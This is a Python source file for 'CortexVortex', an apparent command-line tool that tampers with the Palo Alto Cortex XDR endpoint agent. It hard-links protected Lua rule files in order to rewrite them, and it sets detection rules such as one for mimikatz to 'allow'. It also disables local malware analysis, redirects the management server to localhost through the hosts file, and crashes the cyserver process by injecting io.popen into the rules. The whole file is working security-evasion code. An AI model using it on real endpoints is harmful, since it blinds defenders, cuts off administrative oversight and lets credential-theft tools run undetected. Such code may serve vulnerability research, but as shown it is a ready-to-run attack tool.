"""
This module provides utilities for Palo Alto Cortex XDR.

It includes:
    1. creating an hard link (without write permissions) to a target file.
    2. modify lua rules (based on the dse_rules_config.lua file)
    3. invoke a check-in operation which cause the XDR to load new rules.
    4. update cyserver policy rules localy (without connection to the managment server)
    5. get managment-server URL. 
"""

import argparse
import json
import logging
import os
import random
import re
import subprocess
import tempfile
from time import sleep

import psutil

from filesystem_link import create_hard_link
from logger import init_logger

TEMP_PATH = os.path.expandvars(r'%temp%\\')

SERVICE_MAIN_PY_PATH = os.path.expandvars(r'%ProgramData%\Cyvera\LocalSystem\Python\scripts\service_main.py')

DSE_RULES_FILE = os.path.expandvars(r'%ProgramData%\Cyvera\LocalSystem\Download\content\dse_rules_config.lua')

MALWARE_RULES_FILE = os.path.expandvars(r'%ProgramData%\Cyvera\LocalSystem\Download\content\malware.lua')

HOSTS_FILE_PATH = os.path.expandvars(r'%SystemRoot%\System32\drivers\etc\hosts')

PREVENTION_FOLDER_PATH = os.path.expandvars(r'%ProgramData%\Cyvera\Prevention')

CYTOOL_PATH = os.path.expandvars(r'%ProgramFiles%\Palo Alto Networks\Traps\cytool')

MGMT_URL_FILE_1 = os.path.expandvars(r'%ProgramData%\Cyvera\LocalSystem\Data\db_backup\core_home_url.txt')



ENABLE_WILD_FIRE_RULE = "file_settings.EnableWildFire"
BLOCK_HASH_CONTROL_RULE = "file_settings.BlockHashControl"
ENABLE_HASH_CONTROL_RULE = "file_settings.EnableHashControl"
ENABLE_SIGNER_CONTROL_RULE = "file_settings.EnableSignerControl"
LOCAL_ANALYSIS_RULES = [ENABLE_WILD_FIRE_RULE, BLOCK_HASH_CONTROL_RULE, ENABLE_HASH_CONTROL_RULE, ENABLE_SIGNER_CONTROL_RULE]

LOCALHOST = "127.0.0.1"
MGMT_URL_FILE_2 = "cloud_frontend.json"
ACTION_VALUES = ["allow", "block", "internal"]
ENABLED_OPTIONS = ["enable", "disable"]
STATUS_SUCCESS = 0x0
STATUS_ACCESS_VIOLATION = 0xC0000005

def _do_checkin():
    """
    Performs a check-in operation.

    This function initiates a check-in operation by invoking a command-line tool cytool.exe 
    The check-in operation causes cyserver to reload the rules from the Lua files.

    :return: The return code of the check-in operation.
    """

    # This is cause cyserver to load again the rules from the lua file.
    args = [CYTOOL_PATH, 'checkin']
    p = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return_code = p.wait()
    sleep(10)
    return return_code

def start_cyserver():
    """
    Starts the cyserver.exe process.

    This function starts the cyserver processby invoking a command-line tool cytool.exe 

    :return: The return code of the cytool runtime cyserver start.
    """

    # This is cause cyserver to load again the rules from the lua file.
    args = [CYTOOL_PATH, 'runtime', 'start', 'cyserver']
    p = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return_code = p.wait()
    return return_code

def get_management_url():
    """
    Retrieves the management server URL using two methods.

    This function attempts to retrieve the management server URL using two methods:
    1. Reads from a specified file (MGMT_URL_FILE_1).
    2. Searches for a specific file (MGMT_URL_FILE_2) in a 
    specified folder (MGMT_FOLDER_PATH) and extracts the URL from its contents.

    :return: The management server URL if found, otherwise None.
    """
    mgmt_url = None

    # Method 1 of getting the manegment server URL:
    if os.path.exists(MGMT_URL_FILE_1):
        with open(MGMT_URL_FILE_1, 'r', encoding='utf8') as mgmt_server_url_file:
            mgmt_url = mgmt_server_url_file.read()

        return mgmt_url.removeprefix("https://")
    else:
        logging.error("Managment file: %s was not found", MGMT_URL_FILE_1)


    # Method 2 of getting the manegment server URL:
    cloud_frontend_file = None

    for dirpath, _, filenames in os.walk(PREVENTION_FOLDER_PATH):
        if cloud_frontend_file is not None:
            break
        for filename in filenames:
            if filename == MGMT_URL_FILE_2:
                file_path = os.path.join(dirpath, filename)
                cloud_frontend_file = file_path
                break

    if cloud_frontend_file is None:
        raise FileNotFoundError("cloud_frontend file not found, Failed to retrive MGMT URL")

    with open(cloud_frontend_file, 'r', encoding='utf8') as json_file:
        file_data = json.load(json_file)
        try:
            mgmt_url = file_data['entries'][1]['value']['cloud_communication_data'] \
                ['home_server']['url']
            logging.info("Found MGMT URL: %s", mgmt_url)
            return mgmt_url.removeprefix("https://")
        
        except KeyError as e:
            logging.error("Failed to retrive MGMT URL from cloud_frontend file")
            logging.error(e)
            logging.error("Exiting")
            exit()

def modify_lua_config(lua_file_path, config_name, new_action):
    """
    Modifies the action of a Lua configuration in a specified file.

    This function modifies the action of a Lua configuration specified
    by `config_name` in the Lua file located at `lua_file_path`.
    It updates the action to `new_action` and writes the modified content back to the file.

    :param lua_file_path: The path to the Lua file.
    :param config_name: The name of the Lua configuration to modify.
    :param new_action: The new action to set for the configuration, this value can be <allow, block, internal>
    """

    if new_action not in ACTION_VALUES:
        raise ValueError("Wrong value, values can be <allow, block, internal>")
    
    try:
        with open(lua_file_path, 'r', encoding='utf8') as file:
            lua_content = file.readlines()
    except PermissionError:
        logging.error("Failed to read %s", lua_file_path)
        return False

    found_config = False
    config_lines_to_modify = []

    # The following patterns used to identify rules within the dse rules file.
    config_name_pattern = f'.*\\[".*?{config_name}.*"\\] = '
    action_pattern = r"action = \"(.+?)\""

    # Get all the lines that contains the given config_name
    for i, line in enumerate(lua_content):
        # Check if the current line contains the configuration name
        if re.match(config_name_pattern, line):
            found_config = True
            config_lines_to_modify.append(i)


    if found_config:
        # Write the modified Lua content back to the file
        for line_idx in config_lines_to_modify:
            action_idx = 0
            try:
                while not re.search(action_pattern, lua_content[line_idx + action_idx]):
                    action_idx+= 1
            except IndexError:
                logging.error("Out of index error when tried to look for action varaible")
                logging.error("Corrupted DSE file \\ Error parsing, discard changes")
                return False

            lua_content[line_idx+action_idx] = re.sub(action_pattern, f'action = "{new_action}"',
                                                      lua_content[line_idx+action_idx])

        try:
            with open(lua_file_path, 'w', encoding='utf8') as file:
                file.write(''.join(lua_content))
        except PermissionError:
            logging.error("Failed to write to %s", lua_file_path)
            return False

        logging.info("Configuration '%s' action has been modified to '%s'", config_name, new_action)

    else:
        logging.warning("Configuration '%s' not found in the Lua file.", config_name)

    return True


def create_temp_hard_link(file_to_link):
    """
    Creates a temporary hard link to a specified file.
    :param file_to_link: The path of the file to create a hard link to.
    :return: A string representing the path of the linked file.
    """
    linked_dse_file_name = TEMP_PATH + os.path.basename(file_to_link) + ".tmp"
    if os.path.exists(linked_dse_file_name):
        os.remove(linked_dse_file_name)

    res = create_hard_link(file_to_link, linked_dse_file_name)

    if res != STATUS_SUCCESS:
        if res == STATUS_ACCESS_VIOLATION:
            raise PermissionError("Failed to linked files, make sure you have permissions to the target file")
        else:
            raise Exception("Failed to hard link files: %d", res)

    logging.info("Successfully Hard linked %s <--> %s", linked_dse_file_name, file_to_link)
    return linked_dse_file_name

def add_entry_to_hosts(url_to_add):
    """
    Adds an entry to the hosts file if it doesn't already exist.
    :param url_to_add: The URL to be added to the hosts file.
    """

    try:
        if os.path.exists(HOSTS_FILE_PATH):
            with open(HOSTS_FILE_PATH, 'r', encoding='utf8') as file:
                lines = file.readlines()

             # Check if the URL is already in the hosts file
            if any(url_to_add in line for line in lines):
                logging.debug("The URL %s already exists in the hosts file.", url_to_add)
                return True

            with open(HOSTS_FILE_PATH, 'a', encoding='utf8') as file:
                file.write(f"\n{LOCALHOST}\t{url_to_add}\n")
                return True
        else:
            with open(HOSTS_FILE_PATH, 'w', encoding='utf8') as file:
                logging.debug("Hosts file not found, creating new one")
                file.write(f"\n{LOCALHOST}\t{url_to_add}\n")
                return True

    except PermissionError:
        logging.error("Permission denied when tried to edit hosts file. Please run the script with appropriate permissions.")
        exit()
    
    return False


def update_cyserver_policy():
    """
    Updates the CyServer policy without connection to the managment server.
    This will allow the cyserver.exe process to load new rules.
    """


    mgmt_url = get_management_url()
    if mgmt_url:
        logging.debug("Found managment server URL: %s", mgmt_url)
    else:
        logging.error("Failed to find manegment server URL")
        return False

    logging.info("Inserting managment URL to hosts file")
    if not add_entry_to_hosts(mgmt_url):
        logging.error("Failed to update hosts file")
        return False

    logging.info("Initiating check-in (~10 seconds)")
    _do_checkin()
    return True


def modify_rules_and_update(rules_file, rule_to_modify, new_action):
    """
    Modifies rules in the linked DSE and updates the cyserver.exe policy.

    This function modifies rules specified in `rules_to_modify` in the linked DSE file.
    Then it updates the CyServer policy.

    :param rules_file: The linked DSE config file to modify rules in.
    :param rules_to_modify: A list of rules to modify.
    :param new_action: The new action to apply to the modified rules.
    """
    linked_dse_file = create_temp_hard_link(rules_file)

    result = modify_lua_config(linked_dse_file, rule_to_modify, new_action)

    if result:
        logging.info("Rules modified sucussfully")
        update_cyserver_policy()
    else:
        raise Exception("Failed to modify rules")
    
    logging.info("Unlink files %s <-X-> %s",linked_dse_file, rules_file)
    os.remove(linked_dse_file)


def is_cyserver_running():
    """
    Check if the process 'cyserver.exe' is running.

    Returns:
        bool: True if the process 'cyserver.exe' is running, False otherwise.
    """

    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == 'cyserver.exe':
            return True
    return False

def modify_local_analysis(action):
    linked_malware_rules_file =  create_temp_hard_link(MALWARE_RULES_FILE)

    with open(linked_malware_rules_file,'r+', encoding='utf8') as malware_rules:
        new_malware_rules_data = malware_rules.read()
        for local_analysis_rule in LOCAL_ANALYSIS_RULES:
            logging.info("Modifying rule: %s = %s", local_analysis_rule, action)
            if action == "disable":
                new_malware_rules_data = new_malware_rules_data.replace(f"{local_analysis_rule} = true", f"{local_analysis_rule} = false")
            else:
                new_malware_rules_data = new_malware_rules_data.replace(f"{local_analysis_rule} = false", f"{local_analysis_rule} = true")

        malware_rules.seek(0)
        malware_rules.write(new_malware_rules_data)
        malware_rules.truncate()

    logging.info("All rules has been modified")
    update_cyserver_policy()

    logging.info("Cortex Local anaylsis is now %s", action)

def restart_cyserver():
    """
    Restart the cyserver process.

    This function performs the following steps:
    1. Creates a temporary hard link to the DSE_RULES_FILE.
    2. Appends exception raise code to the DSE_RULES_FILE.
    3. Updates the cyserver policy (this will cause cyserver to crash)
    4. Waits until the cyserver process crashed.
    5. Restores the original content of the DSE_RULES_FILE.
    6. Starts the cyserver process.
    
    Returns:
        bool: True if the process 'cyserver.exe' was restarted, False otherwise.

    """
    logging.info("Restarting cyserver.exe")

    linked_dse = create_temp_hard_link(DSE_RULES_FILE)
    with open(linked_dse,'r+', encoding='utf8') as dse_file:
        original_lines = dse_file.read()
        dse_file.seek(0, 2)
        dse_file.write("\n--io.popen exception raise:\n")
        dse_file.write('io.popen("cmd")\n')

    logging.info("Inserting crashing command to DSE file")
    if not update_cyserver_policy():
        logging.error("Failed to update cyserver policy")
        logging.warning("Revert changes")

        # Revert the changes:
        with open(linked_dse, 'w', encoding='utf8') as file:
            file.write(original_lines)

        return False

    while is_cyserver_running():
        sleep(1)

    logging.info("cyserver.exe crashed successfully")
    logging.info("Reverting changes for DSE_rules_config.lua")

    with open(linked_dse, 'w', encoding='utf8') as file:
        file.write(original_lines)

    logging.info("Starting cyserver again")
    sleep(5)
    start_cyserver()
    os.remove(linked_dse)
    return True

def main():
    """CortexVortex: A command-line tool for controling Cortex XDR.

    CortexVortex enables you to modify Cortex XDR settings, such as changing rules,
    restarting the XDR process, and disabling the local analysis engine.

    Examples:
    CortexVortex change_rules --rules_file --rule_name mimikatz --new_value allow
    CortexVortex local_analysis disable
    CortexVortex restart_xdr
    """

    init_logger()

    parser = argparse.ArgumentParser(
        description="CortexVortex: A command-line tool for managing Cortex XDR.\nCortexVortex enables you to modify Cortex XDR settings, such as changing rules, restarting the XDR process, and disabling the local analysis engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""\
Examples:
  %(prog)s change_rules -rules_file <default: {DSE_RULES_FILE}> -rule_name <rule_name_to_change> -new_value <allow, block, internal>
  %(prog)s -local_analysis <enable, disable>
  %(prog)s restart_xdr
""")
    
    subparsers = parser.add_subparsers(title="Available commands", metavar="")

    # Subparser for 'change_rules' command
    parser_change_rules = subparsers.add_parser('change_rules', help='Change Cortex XDR rules')
    parser_change_rules.add_argument('--rules_file', default=DSE_RULES_FILE, help=f'Optional rules file (default: {DSE_RULES_FILE})')
    parser_change_rules.add_argument('--rule_name', required=True, help='Name of the rule to change')
    parser_change_rules.add_argument('--new_value',required=True, choices=ACTION_VALUES, help='New value for the rule (allow, block, internal)')
    parser_change_rules.set_defaults(func=modify_rules_and_update)

    # Subparser for 'local_analysis' command

    parser_local_analysis = subparsers.add_parser('local_analysis', help="Disable/Enable XDR's local analysis")
    parser_local_analysis.add_argument('local_analysis', help='Enable \ Disable', choices=('enable', 'disable'))
    parser_local_analysis.set_defaults(func=modify_local_analysis)

    # Subparser for 'restart_xdr' command
    parser_restart_xdr = subparsers.add_parser('restart_xdr', help='Restart Cortex XDR process')
    parser_restart_xdr.set_defaults(func=restart_cyserver)

    args = parser.parse_args()
    if hasattr(args, 'func'):
        if args.func == modify_local_analysis:
            modify_local_analysis(args.local_analysis)

        if args.func == modify_rules_and_update:
            modify_rules_and_update(args.rules_file, args.rule_name, args.new_value)

        if args.func == restart_cyserver:
            restart_cyserver()
            logging.info("cyserver.exe restarted successfully")

        
        logging.info("Done")

if __name__ == "__main__":
    main()
